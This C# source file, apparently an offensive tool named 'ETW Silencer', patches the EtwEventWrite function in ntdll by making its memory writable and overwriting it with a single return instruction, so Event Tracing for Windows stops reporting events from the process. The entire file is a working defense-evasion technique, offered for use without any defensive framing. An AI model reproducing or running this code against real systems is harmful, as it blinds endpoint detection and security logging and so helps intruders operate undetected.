using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ETW_Silencer_CSharp
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", EntryPoint = "LoadLibraryA", SetLastError = true)]
        public static extern IntPtr LoadLibraryW(string lpszLib);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool FreeLibrary(IntPtr hModule);


        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        public static IntPtr GetNTAPIAddress(string NTAPIName)
        {

            IntPtr ntlib = LoadLibraryW("ntdll.dll");
            if (ntlib == IntPtr.Zero)
            {
                FreeLibrary(ntlib);
                return IntPtr.Zero;
            }
            IntPtr address = GetProcAddress(ntlib, NTAPIName);
            if (address == IntPtr.Zero)
            {
                FreeLibrary(ntlib);
                return IntPtr.Zero;
            }
            //Console.WriteLine($"{address}");


            FreeLibrary(ntlib);
            return address;
        }
        static void Main(string[] args)
        {
            byte[] ret = new byte[1] { 0xc3 };
            UIntPtr retsize = (UIntPtr)ret.Length;

            uint foldProtect = 0;
            uint soldProtect = 0;

            IntPtr EtwAddress = GetNTAPIAddress("EtwEventWrite");
            Console.WriteLine("EtwEventWrite address is: \n\t0x{0:2X}", EtwAddress);



            if (VirtualProtect(EtwAddress, retsize, (uint)PageProtection.READWRITE, out foldProtect ) == false)
            {
                Console.WriteLine("[-] Unable to flip protection on EtwEventWrite");
                return;
            }
            Console.WriteLine("[+] EtwEventWrite protection flipped to: \n\tREADWRITE");

            Marshal.Copy(ret, 0, EtwAddress, (int)retsize);

            if (VirtualProtect(EtwAddress, retsize, foldProtect, out soldProtect) == false)
            {
                Console.WriteLine("[-] Unable to flip to original protection on EtwEventWrite");
                return;
            }
            Console.WriteLine("[+] ETW silenced !");
            
        }
    }
    // Memory protection constants
    [Flags]
    enum PageProtection : uint
    {
        NOACCESS = 0x01,
        READONLY = 0x02,
        READWRITE = 0x04,
        WRITECOPY = 0x08,
        EXECUTE = 0x10,
        EXECUTE_READ = 0x20,
        EXECUTE_READWRITE = 0x40,
        EXECUTE_WRITECOPY = 0x80,
        GUARD = 0x100,
        NOCACHE = 0x200,
        WRITECOMBINE = 0x400,
    }
}
